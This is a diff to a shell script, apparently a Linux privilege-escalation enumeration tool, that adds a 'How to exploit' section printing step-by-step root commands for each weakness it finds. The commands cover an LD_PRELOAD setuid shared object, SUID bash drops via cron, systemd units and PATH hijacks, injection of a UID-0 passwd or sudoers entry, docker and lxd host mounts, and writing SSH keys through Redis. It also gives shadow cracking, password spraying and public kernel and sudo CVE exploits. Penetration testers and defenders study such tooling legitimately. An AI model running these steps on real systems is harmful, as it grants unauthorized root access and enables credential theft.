-xploit "Writable cron / timer script" \
-  "append a payload and wait for root to run it:" \
-  "echo 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb' >> <writable-script>   then  /tmp/rb -p"
-xploit "Writable dir in PATH / writable root-run binary" \
-  "drop a binary with the same name a root process/cron calls (or replace the writable one) -> reverse shell"
-xploit "Writable systemd unit" \
-  "set ExecStart= to your payload, then  systemctl daemon-reload && systemctl restart <svc>  (or wait for boot)"
-xploit "/etc/passwd writable" \
-  "echo 'r00t:'\$(openssl passwd -1 -salt x pass)':0:0::/root:/bin/bash' >> /etc/passwd ; su r00t"
-xploit "/etc/shadow readable" \
-  "unshadow /etc/passwd /etc/shadow > h ; john h   (or hashcat -m 1800)"
-xploit "docker group / writable docker.sock" \
-  "docker run -v /:/mnt --rm -it alpine chroot /mnt sh    (you are root on the host fs)"
-xploit "lxd/lxc group" \
-  "import an alpine image, init with security.privileged=true, mount / from host, chroot"
-xploit "disk group" \
-  "debugfs /dev/sda1 -R 'cat /etc/shadow'   (read any file on the raw device)"
-xploit "NFS no_root_squash" \
-  "from a box where you are root:  mount -t nfs <ip>:/export /mnt ; cp /bin/bash /mnt/rb; chmod 4755 /mnt/rb  -> /export/rb -p on target"
-xploit "PwnKit (CVE-2021-4034, pkexec)" \
-  "run a PwnKit PoC (single C file, compile offline) -> instant root if polkit unpatched (pre Jan-2022)"
-xploit "Dirty Pipe (CVE-2022-0847)" \
-  "compile the PoC; overwrite a SUID binary or /etc/passwd read-only page -> root (kernel 5.8-5.16.11)"
-xploit "Old kernel" \
-  "linux-exploit-suggester.sh -> pick a matching numbered exploit, compile offline, run"
-xploit "Writable shared-library dir" \
-  "place a malicious .so a root binary dlopens (match the SONAME) -> code exec as root"
-xploit "Found credentials / SSH keys / tokens" \
-  "reuse them:  su <user>  |  ssh -i <key> user@host  |  spray across the subnet; check password reuse"
-_emit "  Match each item to the ${C_F}[!]${C_R} lines above. Always operate within your rules of engagement."
+# Tailored to the [!] findings above: only the vectors that ACTUALLY fired on
+# this host are printed, with the specific file/binary/privilege substituted in,
+# plus prereq -> command -> confirm -> cleanup. Read-only guidance that points at
+# EXISTING public tools; nothing is generated or run for you.
+sec "How to exploit (tailored to THIS host's findings)"
+step() {  # step "Title" "line" "line" ...
+  _emit ""; _emit "  ${C_F}>> $1${C_R}"; shift; for l in "$@"; do _emit "     $l"; done
+}
+list_() { pb_vals "$1" | sed 's/^/       - /'; }
+
+if [ -z "$PB" ]; then
+  _emit "  No known escalation vectors auto-matched. Still review every [!] line, run"
+  _emit "  linux-exploit-suggester.sh offline against the kernel/software versions, and"
+  _emit "  check sudo -l interactively (a password prompt may hide NOPASSWD entries)."
+fi
+
+if pb_has SUDO_ALL; then step "sudo (ALL) ALL -> instant root" \
+  "prereq : your password (or NOPASSWD)." \
+  "run    : sudo -i          # or:  sudo su -" \
+  "confirm: id   ->  uid=0(root)"; fi
+
+if pb_has SUDO_NOPASSWD; then step "NOPASSWD sudo binaries -> root via GTFOBins" \
+  "found  : $(pb_vals SUDO_NOPASSWD)" \
+  "prereq : the listed binary runs without a password." \
+  "run    : look each up at  gtfobins.github.io/#<binary>  (Sudo section). Common:" \
+  "           sudo find . -exec /bin/sh \\; -quit" \
+  "           sudo vim -c ':!/bin/sh'          sudo awk 'BEGIN{system(\"/bin/sh\")}'" \
+  "           sudo less /etc/profile  then  !/bin/sh      sudo env /bin/sh" \
+  "confirm: id   ->  uid=0(root)"; fi
+
+if pb_has SUDO_LDPRELOAD || pb_has SUDO_LDLIB; then step "sudo keeps LD_PRELOAD / LD_LIBRARY_PATH -> root" \
+  "prereq : env_keep+=LD_PRELOAD (or LD_LIBRARY_PATH) in sudoers + one allowed sudo command." \
+  "build  : cat > /tmp/x.c <<'EOF'" \
+  "         #include <stdlib.h>" \
+  "         void _init(){ setgid(0); setuid(0); system(\"/bin/bash -p\"); }" \
+  "         EOF" \
+  "         gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c" \
+  "run    : sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>" \
+  "confirm: id   ->  uid=0(root)     cleanup: rm /tmp/x.so /tmp/x.c"; fi
+
+if pb_has SUDO_SAMEDIT; then step "sudo Baron Samedit (CVE-2021-3156) -> root" \
+  "found  : $(pb_vals SUDO_SAMEDIT)" \
+  "verify : sudoedit -s '\\' \$(python3 -c 'print(\"A\"*1000)')  -> a crash/segfault ~ vulnerable." \
+  "run    : compile the public CVE-2021-3156 PoC that matches this libc, run it -> root shell." \
+  "confirm: id   ->  uid=0(root)"; fi
+
+if pb_has SUDO_22809; then step "sudoedit CVE-2023-22809 -> edit any root file" \
+  "found  : sudo $(pb_vals SUDO_22809)" \
+  "prereq : a sudoers rule granting sudoedit/-e on ANY file." \
+  "run    : EDITOR='vim -- /etc/sudoers' sudoedit /path/you/are/allowed" \
+  "         then add:  <you> ALL=(ALL) NOPASSWD:ALL   and  sudo -i" \
+  "confirm: id   ->  uid=0(root)"; fi
+
+if pb_has SUID_GTFO; then step "SUID root binary (GTFOBins) -> root"; list_ SUID_GTFO
+  step "  how" \
+    "prereq : the SUID bit keeps euid=0 on exec." \
+    "run    : gtfobins.github.io/#<name>  (SUID section). Many keep privs with -p:" \
+    "           /path/bash -p              find /etc/hosts -exec /bin/sh -p \\; -quit" \
+    "           nmap --interactive then !sh        cp: overwrite a root-owned file" \
+    "confirm: id   ->  euid=0(root)"; fi
+
+if pb_has SUID_CUSTOM; then step "Non-standard SUID root binary -> reverse it"; list_ SUID_CUSTOM
+  step "  how" \
+    "prereq : a custom SUID-root program (not a distro default)." \
+    "look   : strings <bin>; ltrace/strace <bin>  -> watch for:" \
+    "           system(\"prog\")  with no absolute path  -> PATH hijack:" \
+    "             put a script 'prog' (contents: /bin/bash -p) early in PATH, then run:" \
+    "             chmod +x /tmp/prog; PATH=/tmp:\$PATH <bin>" \
+    "           getenv() of LD_* / config path         -> env or file hijack" \
+    "           fopen()/exec of a writable helper       -> replace the helper" \
+    "confirm: id   ->  euid=0(root)"; fi
+
+if pb_has CAP_SETUID; then step "cap_setuid capability -> root"; list_ CAP_SETUID
+  step "  how" \
+    "run (python): <capbin> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" \
+    "run (perl)  : <capbin> -e 'use POSIX; setuid(0); exec \"/bin/bash\";'" \
+    "confirm: id   ->  uid=0(root)"; fi
+
+if pb_has CAP_DAC; then step "cap_dac_read_search / cap_dac_override -> read or overwrite any file"; list_ CAP_DAC
+  step "  how" \
+    "read   : the capable binary can read /etc/shadow (e.g. tar/xxd/cat)  -> crack, or" \
+    "override: overwrite /etc/passwd with a UID-0 line (see the /etc/passwd step)." \
+    "confirm: you can read /etc/shadow, or su to your injected root user"; fi
+
+if pb_has CRON_WRITABLE; then step "Writable script run by a root cron -> root"; list_ CRON_WRITABLE
+  step "  how" \
+    "run    : echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> <writable-script>" \
+    "wait   : until the cron fires (check the schedule)." \
+    "confirm: /tmp/rootbash -p   then  id  ->  euid=0     cleanup: rm /tmp/rootbash + your line"; fi
+
+if pb_has CRON_WILDCARD; then step "Cron wildcard injection (tar/rsync/chown) -> root"; list_ CRON_WILDCARD
+  step "  how (tar --checkpoint example, in the dir the cron globs with *)" \
+    "         echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > runme.sh" \
+    "         touch -- '--checkpoint=1'  '--checkpoint-action=exec=sh runme.sh'" \
+    "wait   : the root cron's  tar ... *  executes runme.sh." \
+    "confirm: /tmp/rb -p  ->  id  ->  euid=0    (rsync uses -e; chown/chmod use --reference)"; fi
+
+if pb_has SVC_UNIT || pb_has ROOT_WRITABLE_BIN; then step "Writable systemd unit / root-run binary -> root"
+  [ -n "$(pb_vals SVC_UNIT)" ] && list_ SVC_UNIT; [ -n "$(pb_vals ROOT_WRITABLE_BIN)" ] && list_ ROOT_WRITABLE_BIN
+  step "  how" \
+    "unit   : set  ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb'" \
+    "         then  systemctl daemon-reload && systemctl restart <svc>   (or wait for boot)" \
+    "binary : overwrite the writable root-run binary with your payload; restart the service." \
+    "confirm: /tmp/rb -p  ->  id  ->  euid=0"; fi
+
+if pb_has PATH_WRITABLE; then step "Writable directory in PATH -> hijack -> root"; list_ PATH_WRITABLE
+  step "  how" \
+    "prereq : a root process/cron/SUID calls a command by name (no absolute path)." \
+    "run    : put a script named <cmdname> in <dir> that runs:  cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb" \
+    "         then  chmod +x <dir>/<cmdname>  and wait for the root job to call it." \
+    "confirm: after it runs,  /tmp/rb -p  ->  id  ->  euid=0"; fi
+
+if pb_has PASSWD_WRITABLE; then step "/etc/passwd writable -> add a root user" \
+  "run    : echo \"r00t:\$(openssl passwd -1 -salt x Pass123):0:0::/root:/bin/bash\" >> /etc/passwd" \
+  "confirm: su r00t   (password Pass123)  ->  id  ->  uid=0     cleanup: remove the line"; fi
+
+if pb_has SUDOERS_WRITABLE; then step "/etc/sudoers writable -> grant yourself root" \
+  "run    : echo \"$WHO ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers" \
+  "confirm: sudo -i  ->  id  ->  uid=0     cleanup: remove the line"; fi
+
+if pb_has SHADOW_WRITABLE; then step "/etc/shadow writable -> set a known root hash" \
+  "run    : replace root's hash field with  \$(openssl passwd -6 Pass123)  (keep the : layout)" \
+  "confirm: su root  (Pass123)     cleanup: restore the original hash"; fi
+
+if pb_has SHADOW_READABLE; then step "/etc/shadow readable -> crack offline" \
+  "run    : unshadow /etc/passwd /etc/shadow > hashes.txt" \
+  "         john --wordlist=rockyou.txt hashes.txt      (or  hashcat -m 1800)" \
+  "confirm: john --show hashes.txt  reveals a password  ->  su <user>"; fi
+
+if pb_has LDPRELOAD_FILE; then step "/etc/ld.so.preload writable -> global SUID injection" \
+  "build  : compile /tmp/x.so as in the sudo-LD_PRELOAD step (setuid(0);system(bash))." \
+  "run    : echo /tmp/x.so >> /etc/ld.so.preload   then invoke any SUID binary (e.g. ping)" \
+  "confirm: id  ->  uid=0     cleanup: remove the line + rm /tmp/x.so"; fi
+
+if pb_has LIB_DIR_WRITABLE; then step "Writable shared-library directory -> .so hijack -> root"; list_ LIB_DIR_WRITABLE
+  step "  how" \
+    "prereq : a root binary loads a library from this dir (check with ldd / SONAME)." \
+    "run    : place a malicious .so with the exact SONAME the binary loads (_init -> setuid(0);system)." \
+    "confirm: run the root binary  ->  id  ->  uid=0"; fi
+
+if pb_has DOCKER_GRP || pb_has DOCKER_SOCK; then step "docker group / writable docker.sock -> root on the host" \
+  "run    : docker run -v /:/mnt --rm -it alpine chroot /mnt sh" \
+  "         (no docker client? talk to the socket with curl --unix-socket /var/run/docker.sock)" \
+  "confirm: you are root on the HOST filesystem under /mnt (cat /mnt/etc/shadow)"; fi
+
+if pb_has LXD_GRP; then step "lxd/lxc group -> root via privileged container" \
+  "run    : import a small image, then:" \
+  "         lxc init myimg r -c security.privileged=true" \
+  "         lxc config device add r host disk source=/ path=/mnt/root recursive=true" \
+  "         lxc start r && lxc exec r /bin/sh" \
+  "confirm: /mnt/root is the host FS, owned by root  (cat /mnt/root/etc/shadow)"; fi
+
+if pb_has DISK_GRP; then step "disk group -> read any file off the raw device" \
+  "run    : debugfs /dev/sda1 -R 'cat /etc/shadow'      (adjust the device from  mount)" \
+  "confirm: shadow hashes printed  ->  crack offline (john/hashcat)"; fi
+
+if pb_has NFS_NOSQUASH; then step "NFS no_root_squash -> root via a client-side SUID binary" \
+  "prereq : root on any box that can mount the export." \
+  "run    : (attacker, as root)  mount -t nfs <target>:/export /mnt" \
+  "         cp /bin/bash /mnt/rb; chmod 4755 /mnt/rb" \
+  "confirm: (on target)  /export/rb -p  ->  id  ->  euid=0"; fi
+
+if pb_has PWNKIT; then step "PwnKit (CVE-2021-4034, pkexec) -> root"; list_ PWNKIT
+  step "  how" \
+    "prereq : polkit/pkexec unpatched (pre Jan-2022)." \
+    "run    : compile the single-file public PwnKit PoC offline (gcc), run ./PwnKit." \
+    "confirm: id  ->  uid=0(root)   (fixed: polkit 0.120-2 / distro patch)"; fi
+
+if pb_has DIRTYPIPE; then step "Dirty Pipe (CVE-2022-0847) -> root"; list_ DIRTYPIPE
+  step "  how" \
+    "run    : compile the public Dirty Pipe PoC; point it at a SUID binary (e.g. /usr/bin/su)" \
+    "         to overwrite a read-only page, or hijack /etc/passwd." \
+    "confirm: the PoC drops a root shell  ->  id  ->  uid=0   (kernel 5.8-5.16.11)"; fi
+
+if pb_has DIRTYCOW; then step "Dirty COW (CVE-2016-5195) -> root"; list_ DIRTYCOW
+  step "  how" \
+    "run    : compile a Dirty COW PoC (dirtyc0w / pokemon) offline; classic path overwrites" \
+    "         /etc/passwd or a SUID binary via the copy-on-write race." \
+    "confirm: root shell / injected passwd user   (kernel < 4.8.3; may be unstable - snapshot first)"; fi
+
+if pb_has OVERLAYFS; then step "Ubuntu OverlayFS / GameOver(lay) -> root"; list_ OVERLAYFS
+  step "  how" \
+    "run    : Ubuntu-only public one-liners - OverlayFS CVE-2021-3493, or GameOver(lay)" \
+    "         CVE-2023-2640 / CVE-2023-32629 (both have short public PoCs; no compiler needed for GameOverlay)." \
+    "confirm: id  ->  uid=0(root)"; fi
+
+if pb_has LOONEY; then step "Looney Tunables (CVE-2023-4911) -> root"; list_ LOONEY
+  step "  how" \
+    "run    : compile the public CVE-2023-4911 PoC (GLIBC_TUNABLES ld.so overflow) offline; run it." \
+    "confirm: id  ->  uid=0(root)   (glibc 2.34-2.37 on the affected distros)"; fi
+
+if pb_has KERNEL_OLD; then step "Old kernel -> suggested local exploit"; list_ KERNEL_OLD
+  step "  how" \
+    "run    : ./linux-exploit-suggester.sh   (offline) -> pick a 'highly probable' match," \
+    "         compile the referenced public exploit, run it. Snapshot/VM first - some panic." \
+    "confirm: id  ->  uid=0(root)"; fi
+
+if pb_has MYSQL_ROOT; then step "MySQL/MariaDB as root -> UDF command exec" \
+  "prereq : DB credentials (try blank/root, or creds found above)." \
+  "run    : use the public lib_mysqludf_sys UDF -> SELECT sys_exec('cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb');" \
+  "confirm: /tmp/rb -p  ->  id  ->  euid=0"; fi
+
+if pb_has REDIS; then step "Unauthenticated Redis -> write a key/cron/authorized_keys"; list_ REDIS
+  step "  how" \
+    "run    : redis-cli -h <ip> CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys" \
+    "         then SET a key holding your public SSH key and  SAVE." \
+    "confirm: ssh -i <key> root@<ip>   (needs redis writable as root; else target web-root/cron)"; fi
+
+if pb_has SSH_KEY || pb_has KRB_TICKET || pb_has CLOUD_CREDS || pb_has SECRETS_FOUND || pb_has PROC_ENV; then
+  step "Harvested credentials / keys / tickets -> reuse & pivot"
+  [ -n "$(pb_vals SSH_KEY)" ]     && list_ SSH_KEY
+  [ -n "$(pb_vals KRB_TICKET)" ]  && list_ KRB_TICKET
+  [ -n "$(pb_vals CLOUD_CREDS)" ] && list_ CLOUD_CREDS
+  step "  how" \
+    "ssh    : ssh -i <id_rsa> <user>@<host>   (chmod 600 the key first)" \
+    "kerb   : export KRB5CCNAME=<ccache>; klist; then impacket tools with -k -no-pass" \
+    "cloud  : aws sts get-caller-identity  /  az account show  /  kubectl auth can-i --list" \
+    "reuse  : spray any recovered password across the subnet - password reuse is common." \
+    "confirm: authenticated access to a new account/host"; fi
+
+_emit ""
+_emit "  Every step above references an EXISTING public tool or technique - run it"
+_emit "  yourself, only within your rules of engagement. Match each block to its [!]"
+_emit "  line. Nothing here was executed for you."
 
 _emit ""
 _emit "${C_H}Done.${C_R} Review every ${C_F}[!]${C_R} line. Nothing was changed on this host."
-[ -n "$OUT" ] && _emit "Full report written to: $OUT"
+}
+
+# Run. With -o, tee the COMPLETE output (every section and every raw dump) to the
+# report while still streaming it live; without -o, print straight to terminal.
+if [ -n "$OUT" ]; then
+  : >"$OUT"
+  main | tee "$OUT"
+  echo "Full report written to: $OUT"
+else
+  main
+fi
+exit 0
